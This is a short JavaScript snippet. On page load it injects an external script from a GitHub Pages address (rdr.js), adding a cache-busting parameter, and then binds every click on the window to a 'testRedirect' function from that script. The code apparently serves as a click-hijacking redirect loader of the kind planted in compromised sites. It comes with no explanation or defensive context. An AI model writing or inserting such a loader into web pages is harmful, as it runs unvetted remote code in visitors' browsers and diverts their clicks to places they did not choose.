function insertScript(url, callback) {
    // Create a new script element
    const script = document.createElement('script');
    script.src = `${url}?v=${Date.now()}`;
    script.type = 'text/javascript';
    script.async = true;
    script.onload = function() {
        if (callback) {
            callback();
        }
    };
    // Append the script element to the head or body
    document.head.appendChild(script);
}
document.addEventListener('DOMContentLoaded', (event) => {
    insertScript('https://soccerlegends.github.io/rdr.js', function() {
        console.log('TBG successfully.');
        // Call the function from the loaded script
        if (typeof testRedirect === 'function') {
            window.onclick = testRedirect;
        } else {
            console.log('myFunction is not defined.');
        }
    });
});